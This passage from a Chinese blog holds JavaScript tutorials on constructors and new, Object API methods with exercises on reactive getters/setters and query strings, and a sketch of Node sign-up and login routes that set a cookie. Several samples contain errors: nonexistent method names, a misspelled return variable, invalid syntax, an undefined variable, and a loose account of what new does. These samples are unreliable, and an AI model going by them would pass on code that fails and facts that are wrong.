<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>当我们使用 MVC 思想将代码模块化后，每个 js 文件中代码没有重复，很精简，但是当我们跨文件观察我们的 js 时，发现每个 js 文件都有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">let view = document.querySelect( &apos;xxx&apos; )</span><br><span class="line">let model = &#123;</span><br><span class="line">    init: function()&#123;&#125;,</span><br><span class="line">    fetch: function()&#123;&#125;,</span><br><span class="line">    save: function()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">let controller = &#123;</span><br><span class="line">    view: null,</span><br><span class="line">    model: null,</span><br><span class="line">    init: function()&#123;</span><br><span class="line">        this.view = view</span><br><span class="line">        this.model = model</span><br><span class="line">        this.model.init()</span><br><span class="line">        this.init()</span><br><span class="line">        this.bingEvents()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这是一种跨文件的重复，如果我们抽丝剥茧便可以对重复的地方进行分类，在全局范围内创造一个模板，每一个重复的地方都是有全局模板制造出来的，这个模板就是之前提到的 <strong>类</strong>。</p>
<p>我们创建一个 base 文件目录，里面有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base/View.js</span><br><span class="line">    window.View = function()&#123;&#125;</span><br><span class="line">base/Model.js</span><br><span class="line">    window.Model = function()&#123;&#125;</span><br><span class="line">base/Controller.js</span><br><span class="line">    window.Controller = function()&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>之后每个文件的重复的地方都使用全局变量 View()、Model() 和 Controller() ，这三个全局变量便是之前提到的 <strong>构造函数</strong></p>
<h1 id="new-操作符"><a href="#new-操作符" class="headerlink" title="new 操作符"></a>new 操作符</h1><p>new 操作符主要是一个语法，它主要做了：</p>
<ol>
<li><code>var temp = {}</code></li>
<li><code>this = temp</code></li>
<li><code>构造函数.prototype = { constructor: 构造函数 }</code></li>
<li><code>this.__proto__ = 构造函数.prototype</code></li>
<li><code>return this</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">构造函数.prototype = &#123;</span><br><span class="line">    constructor: 构造函数,</span><br><span class="line">    // 共有属性</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="制作一个简单的-new"><a href="#制作一个简单的-new" class="headerlink" title="制作一个简单的 new"></a>制作一个简单的 new</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Human(options)&#123;</span><br><span class="line">    this.name = options.name</span><br><span class="line">    this.city = options.city</span><br><span class="line">&#125;</span><br><span class="line">Human.prototype.constroctor = Human</span><br><span class="line">Human.prototype.species = &apos;person&apos;</span><br><span class="line">Human.prototype.walk = function()&#123;</span><br><span class="line">    console.log( &apos; I can walk &apos; )</span><br><span class="line">&#125;</span><br><span class="line">Human.prototype.useTools = function()&#123;</span><br><span class="line">    console.log( &apos; I can use tool &apos; )</span><br><span class="line">&#125;</span><br><span class="line">var human = new Human(&#123;name:&apos;xxx&apos;,city:&apos;hangzhou&apos;&#125;)</span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-d04e85a5e0576d2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="new"></p>
<h1 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h1><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var app = app || &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>我们先来了解下 &amp;&amp; 和 || 这两个操作符的含义。这两个操作符返回的是一个 truey | falsey 值</p>
<h5 id="amp-amp-操作符"><a href="#amp-amp-操作符" class="headerlink" title="&amp;&amp; 操作符"></a>&amp;&amp; 操作符</h5><p><img src="http://upload-images.jianshu.io/upload_images/9617841-ec8819c975b440dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="&amp;&amp; 操作符"></p>
<h5 id="操作符"><a href="#操作符" class="headerlink" title="|| 操作符"></a>|| 操作符</h5><p><img src="http://upload-images.jianshu.io/upload_images/9617841-2b30afb11d2718ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="|| 操作符"></p>
<p>所以当我们使用 <code>var app = app || {}</code> 这种写法是最佳实践，因为如果在这个语句之前，<code>app</code> 就有了定义，那么这个语句不会覆盖之前的定义。</p>
<h6 id="注意：-现在再去回头看一眼那个概念，相信你会有深入的理解"><a href="#注意：-现在再去回头看一眼那个概念，相信你会有深入的理解" class="headerlink" title="注意： 现在再去回头看一眼那个概念，相信你会有深入的理解"></a>注意： 现在再去回头看一眼那个概念，相信你会有深入的理解</h6>
      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript-进阶/">JavaScript 进阶</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-07T11:17:07.000Z"><a href="/2018/02/07/JS系列 -- JavaScript 对象之 API/">2018-02-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/07/JS系列 -- JavaScript 对象之 API/">JS系列 -- JavaScript 对象之 API</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>之前介绍了 <a href="https://bowen-wu.github.io/2018/01/10/JS%E7%B3%BB%E5%88%97%20--%20JavaScript%20%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">《JavaScript 对象基础》 </a>，现在我们来介绍一下挂载在 <code>Object.prototype</code> 上的属性</p>
<h1 id="Object-prototype-API"><a href="#Object-prototype-API" class="headerlink" title="Object.prototype API"></a>Object.prototype API</h1><p><code>Object.prototype</code> 表示对象的原型对象<br><code>Object.prototype</code> 属性的属性特征<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">writable ==&gt; 是否可写 ==&gt; false(默认)</span><br><span class="line">enumerable ==&gt; 是否可枚举 ==&gt; false(默认)</span><br><span class="line">configurable ==&gt; 是否可配置 ==&gt; false(默认)</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-assign"><a href="#Object-assign" class="headerlink" title="Object.assign()"></a>Object.assign()</h3><p>用于将所有可枚举属性的值从一个或多个源对象复制到目标对象并返回目标对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object.assign(target, ...sources)  // target 目标对象， sources 源对象</span><br><span class="line"></span><br><span class="line">Object.assign( &#123; a: 2, b: 1 &#125;, &#123; a: 1 &#125; )   // &#123; a: 1, b: 1 &#125;</span><br><span class="line">Object.assign( &#123; a: 1, b: 2 &#125;, &#123; a: &apos;a&apos; &#125;, &#123; c: 3 &#125;, &#123; a: 4 &#125; )  // &#123; a: 4, b: 2, c: 3 &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create()"></a>Object.create()</h3><p>创建一个空对象，空对象的原型指向参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.create( proto[, propertiesObject] ) // 第二参数为一个对象，可以写入新对象的属性 + 描述符</span><br></pre></td></tr></table></figure></p>
<h5 id="使用-Object-create-实现继承"><a href="#使用-Object-create-实现继承" class="headerlink" title="使用 Object.create() 实现继承"></a>使用 Object.create() 实现继承</h5><p><img src="http://upload-images.jianshu.io/upload_images/9617841-985125c7f108b498.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Object.create 实现继承"></p>
<h3 id="Object-setPrototypeOf"><a href="#Object-setPrototypeOf" class="headerlink" title="Object.setPrototypeOf()"></a>Object.setPrototypeOf()</h3><p>设置一个指定的对象的原型到另一个对象或 <code>null</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.setPrototypeOf( obj, prototype ) // 将对象 obj 的原型设置为 prototype（原型 | null）</span><br><span class="line">obj = Object.create( prototype )  === Object.setPrototypeOf( obj, prototype )</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-defineProperty-Object-defineProperties"><a href="#Object-defineProperty-Object-defineProperties" class="headerlink" title="Object.defineProperty() | Object.defineProperties()"></a>Object.defineProperty() | Object.defineProperties()</h3><p>这两个方法都是在一个对象上定义新属性或修改现有属性，并返回对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty( obj, prop, descriptor )</span><br><span class="line">Object.defineProperties( obj, props )</span><br></pre></td></tr></table></figure></p>
<h5 id="属性描述符"><a href="#属性描述符" class="headerlink" title="属性描述符"></a>属性描述符</h5><p>属性描述符分为<strong>数据描述符</strong> 和 <strong>存取描述符</strong>。描述符必须是二者之一</p>
<ul>
<li>数据描述符 ==&gt; value + writable ==&gt; 具有值的属性，该值可能是可写的，也可能是不可写的</li>
<li>存取描述符 ==&gt; set + get<h6 id="描述符可选键值"><a href="#描述符可选键值" class="headerlink" title="描述符可选键值"></a>描述符可选键值</h6></li>
<li><p>configurable ==&gt; 是否可配置 ==&gt; false(默认)</p>
</li>
<li><p>enumerable ==&gt; 是否可枚举 ==&gt; false(默认)</p>
</li>
<li><p>writable ==&gt; 是否可写 ==&gt; false(默认)</p>
</li>
<li><p>value ==&gt; 属性对应的值</p>
</li>
<li><p>get ==&gt; 一个给属性提供 getter 的方法，如果没有 getter 则为 undefined。该方法返回值被用作属性值，默认为 undefined</p>
</li>
<li><p>set ==&gt; 一个给属性提供 setter 的方法，如果没有 setter 则为 undefined。该方法接受唯一参数，并将该参数的新值分配给该属性，默认为 undefined<br><img src="http://upload-images.jianshu.io/upload_images/9617841-3a71e414e2343590.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="属性描述符"><br>如果对象属性有 getter + setter ，那么调用时走 getter，赋值时走 setter，getter + setter 作用：</p>
<ol>
<li>保护私有变量</li>
<li>响应式开发 | 双向数据绑定 | MVVM （<code>Object.definedProperty() + get + set</code>）</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">let person = &#123;&#125;</span><br><span class="line">let ageValue = 18</span><br><span class="line">Object.definePrototype( person, &apos;name&apos;, &#123;</span><br><span class="line">    value: xxx,</span><br><span class="line">    configurable: false,  // 如果不写默认 false</span><br><span class="line">    writable: true,</span><br><span class="line">    enumerable: true</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Object.definePrototype( person, &apos;age&apos;, &#123;</span><br><span class="line">    configurable: false,  // 如果不写默认 false</span><br><span class="line">    enumerable: true,</span><br><span class="line">    get : function()&#123;</span><br><span class="line">        return ageValue;</span><br><span class="line">    &#125;,</span><br><span class="line">    set : function( newValue )&#123;</span><br><span class="line">        ageValue = newValue;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">person.age   // 18</span><br><span class="line">person.age = 19</span><br><span class="line">person.age  // 19</span><br><span class="line"></span><br><span class="line">Object.defineProperties( person, &#123;</span><br><span class="line">    &apos;property1&apos; : &#123;</span><br><span class="line">        value: xxx,</span><br><span class="line">        configurable: false,  // 如果不写默认 false</span><br><span class="line">        writable: true,</span><br><span class="line">        enumerable: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;property2&apos; : &#123;</span><br><span class="line">        value: xxx,</span><br><span class="line">        configurable: false,  // 如果不写默认 false</span><br><span class="line">        writable: true,</span><br><span class="line">        enumerable: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="Object-getOwnPropertyDescriptor"><a href="#Object-getOwnPropertyDescriptor" class="headerlink" title="Object.getOwnPropertyDescriptor()"></a>Object.getOwnPropertyDescriptor()</h3><p>返回制定对象上一个自有属性对应的属性描述符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.getOwnPropertyDescriptor( obj, prop )</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-getOwnPropertyNames"><a href="#Object-getOwnPropertyNames" class="headerlink" title="Object.getOwnPropertyNames()"></a>Object.getOwnPropertyNames()</h3><p>返回一个由指定对象的所有自身属性的属性名（包括不可枚举属性但不包括 Symbol 值作为名称的属性）组成的数组</p>
<h3 id="Object-keys-Object-values"><a href="#Object-keys-Object-values" class="headerlink" title="Object.keys() | Object.values()"></a><a href="https://bowen-wu.github.io/2018/01/10/JS%E7%B3%BB%E5%88%97%20--%20JavaScript%20%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">Object.keys() | Object.values()</a></h3><h3 id="Object-prototype-hasOwnProperty"><a href="#Object-prototype-hasOwnProperty" class="headerlink" title="Object.prototype.hasOwnProperty()"></a>Object.prototype.hasOwnProperty()</h3><p>返回一个布尔值，指示对象自身属性中是否具有指定的属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.hasOwnProperty( prop )</span><br></pre></td></tr></table></figure></p>
<h1 id="使用-get-set-实现需求"><a href="#使用-get-set-实现需求" class="headerlink" title="使用 get + set 实现需求"></a>使用 get + set 实现需求</h1><p>给定一个对象 obj，返回一个新对象，新对象具有对象 obj 的所有属性，并且给新对象每个属性重新赋值都会触发修改函数，在下方代码处填写代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getReactiveObj( obj, cb )&#123;</span><br><span class="line">    // 代码 code</span><br><span class="line">&#125;</span><br><span class="line">let obj = &#123; a: &apos;a&apos;, b: &apos;b&apos; &#125;</span><br><span class="line">function fn( prop,val )&#123;</span><br><span class="line">    console.log( `$&#123; prop &#125;属性的值变为$&#123; val &#125;` )</span><br><span class="line">&#125;</span><br><span class="line">let newObj = getReactiveObj( obj, fn )</span><br><span class="line">console.log( newObj.a )  // a</span><br><span class="line">console.log( newObj.b )  // b</span><br><span class="line">newObj.a = &apos;d&apos;  // a属性的值变为d</span><br><span class="line">console.log( newObj.a )  // d</span><br><span class="line">console.log( obj )  // &#123; a: &apos;a&apos;, b: &apos;b&apos; &#125;</span><br></pre></td></tr></table></figure></p>
<p>解决方案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function getReactiveObj( obj, cb )&#123;</span><br><span class="line">    let result = &#123;&#125;</span><br><span class="line">    Object.keys( obj ).forEach( ( item ) =&gt; &#123;</span><br><span class="line">        let value = obj[ item ]</span><br><span class="line">        Object.defineProperty( result, item, &#123;</span><br><span class="line">            get() &#123;</span><br><span class="line">                return value</span><br><span class="line">            &#125;,</span><br><span class="line">            set( val ) &#123;</span><br><span class="line">                cb.call( null, item, val )</span><br><span class="line">                value = val</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; )</span><br><span class="line">    &#125;)</span><br><span class="line">    return reault</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="实现查询参数"><a href="#实现查询参数" class="headerlink" title="实现查询参数"></a>实现查询参数</h1><p>把一个 JS 对象转化成符合查询参数的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery()&#123;</span><br><span class="line">    // 代码</span><br><span class="line">&#125;</span><br><span class="line">parseToQuery(&#123; id: 100, name: &apos;hello&apos;, groups: &apos;xxx&apos; &#125;)  // &apos;id=100&amp;name=hello&amp;groups=xxx&apos; </span><br><span class="line">parseToQuery(&#123; id: 100, name: &apos;hello&apos;, groups: [ &apos;xxx&apos;, &apos;yyy&apos; ] &#125;)  // &apos;id=100&amp;name=hello&amp;groups=xxx&amp;groups=yyy&apos;</span><br></pre></td></tr></table></figure></p>
<h3 id="实现无数组方法一"><a href="#实现无数组方法一" class="headerlink" title="实现无数组方法一"></a>实现无数组方法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let arr = []</span><br><span class="line">    for( let key in obj )&#123;</span><br><span class="line">        arr.push( encodeURIComponent( key ) + &apos;=&apos; + encodeURIComponent( obj[ key ] ) )</span><br><span class="line">    &#125;</span><br><span class="line">    return arr.join( &apos;&amp;&apos; )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="encodeURIComponent"><a href="#encodeURIComponent" class="headerlink" title="encodeURIComponent()"></a>encodeURIComponent()</h5><p>对统一资源标识符（URI）的组成部分进行编码的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent( str )   // URI 的组成部分</span><br></pre></td></tr></table></figure></p>
<h3 id="实现无数组方法二"><a href="#实现无数组方法二" class="headerlink" title="实现无数组方法二"></a>实现无数组方法二</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let str = &apos;&apos;</span><br><span class="line">    Object.keys( obj ).forEach( ( item ) =&gt; &#123;</span><br><span class="line">        var str1 = ` $&#123; item &#125;=$&#123; obj[ item ] &#125;&amp; `</span><br><span class="line">        str = str.concat( str1 )</span><br><span class="line">    &#125;)</span><br><span class="line">    return str.slice( 0, str.length-1 )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实现无数组方法三"><a href="#实现无数组方法三" class="headerlink" title="实现无数组方法三"></a>实现无数组方法三</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    return Object.keys( obj ).map( ( key ) =&gt; &#123;</span><br><span class="line">        `$&#123; key &#125;=$&#123; obj[ key ] &#125;`).join( &apos;&amp;&apos; )</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实现有数组方法"><a href="#实现有数组方法" class="headerlink" title="实现有数组方法"></a>实现有数组方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let result = &apos;&apos;</span><br><span class="line">    for( let key in obj )&#123;</span><br><span class="line">        if( obj[ key ] instanceof Array )&#123;</span><br><span class="line">            obj[ key ].forEach( (item) =&gt; &#123;</span><br><span class="line">                result += key + &apos;=&apos; + value + &apos;&amp;&apos;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            result += key + &apos;=&apos; + obj[ key ] + &apos;&amp;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result.substring( 0, result.length-1 )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-07T11:13:20.000Z"><a href="/2018/02/07/HTTP系列 -- 注册登录 + Cookie/">2018-02-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/07/HTTP系列 -- 注册登录 + Cookie/">HTTP系列 -- 注册登录 + Cookie</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>我们每天在使用电脑的时候都会去注册或者登录，作为前端是必须要了解其中的过程的。</p>
<h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h1><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>后端需要一个路由，当用户请求注册界面时，后端要去读取注册界面，之后发给前端，并且还要设置 <code>method</code></p>
<ul>
<li><p><code>GET</code> ==&gt; 请求注册页面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_up&apos; &amp;&amp; method === &apos;GET&apos;)&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./sign_up.html&apos;, &apos;utf-8&apos; )</span><br><span class="line">    response.setHeader( &apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos; )</span><br><span class="line">    response.statusCode = 200</span><br><span class="line">    response.write( string )</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>POST</code> ==&gt; 用户注册发送数据（使用表单 | AJAX）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_up&apos; &amp;&amp; method === &apos;POST&apos; )&#123;</span><br><span class="line">    // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构</span><br><span class="line">    readBody( request ).then( () =&gt; &#123;&#125;, () =&gt; &#123;&#125; )</span><br><span class="line">    // 后端进行验证</span><br><span class="line">    // 1. 验证用户输入是否合格</span><br><span class="line">    // 2. 验证用户名是否占用 | 邮箱是否占用（都是去和自己的数据库进行比较）</span><br><span class="line">    // 3. 验证失败 ==&gt; 以 JSON 格式传输给前端错误,400</span><br><span class="line">    // 4. 验证成功 ==&gt; 存储数据库，200</span><br><span class="line">&#125;</span><br><span class="line">function readBody( request )&#123;</span><br><span class="line">    return new Promise( ( resolve, reject ) =&gt; &#123;</span><br><span class="line">        let body = []</span><br><span class="line">        request.on( &apos;data&apos;, ( chunk ) =&gt; &#123;</span><br><span class="line">            body.push( chunk )</span><br><span class="line">        &#125;).on( &apos;end&apos;, () =&gt; &#123;</span><br><span class="line">            body = Buffer.concat( body ).toString()</span><br><span class="line">            resolve( body )</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><h5 id="跳转注册界面"><a href="#跳转注册界面" class="headerlink" title="跳转注册界面"></a>跳转注册界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;/sign_up.html&apos;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="提交用户输入数据"><a href="#提交用户输入数据" class="headerlink" title="提交用户输入数据"></a>提交用户输入数据</h5><ol>
<li>拿到用户输入，可以监听 <code>form</code> 的 <code>submit</code> 事件</li>
<li>前端验证<ul>
<li>验证成功 ==&gt; 下一步</li>
<li>验证失败 ==&gt; 提示用户</li>
</ul>
</li>
<li>发送请求（数据是第四部分 formdata）<ul>
<li><code>form</code> 的 <code>submit</code></li>
<li><code>$post()</code></li>
</ul>
</li>
<li>成功（打印 response） ==&gt; 200 + 渲染页面</li>
<li>失败（打印 response） ==&gt; JSON 格式的字符串 + 解析 + 提示用户</li>
</ol>
<h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h3 id="后端-1"><a href="#后端-1" class="headerlink" title="后端"></a>后端</h3><p>后端需要一个路由，当用户请求登录界面时，后端要去读取登录界面，之后发给前端，并且还要设置 method</p>
<ul>
<li><p><code>GET</code> ==&gt; 请求注册页面</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_in&apos; &amp;&amp; method === &apos;GET&apos;)&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./sign_in.html&apos;, &apos;utf-8&apos; )</span><br><span class="line">    response.setHeader( &apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos; )</span><br><span class="line">    response.statusCode = 200</span><br><span class="line">    response.write( string )</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>POST</code> ==&gt; 用户登录发送数据（使用表单 | AJAX）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">else if(path===&apos;/sign_in&apos; &amp;&amp; method === &apos;POST&apos;)&#123;</span><br><span class="line">    // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构</span><br><span class="line">     readBody( request ).then( () =&gt; &#123;&#125;, () =&gt; &#123;&#125; )</span><br><span class="line">    // 后端进行数据库比对</span><br><span class="line">    // 1. 比对用户是否存在</span><br><span class="line">    // 2. 比对用户输入密码是否正确</span><br><span class="line">    // 3. 比对失败 ==&gt; 以 JSON 格式传输给前端错误,400</span><br><span class="line">    // 4. 比对成功 ==&gt; 设置 Cookie ，200</span><br><span class="line">    response.setHeader( &apos;Set-Cookie&apos;,  &apos;xxx&apos; ) // xxx 就是一个身份证</span><br></pre></td></tr></table></figure>
</li>
</ul>
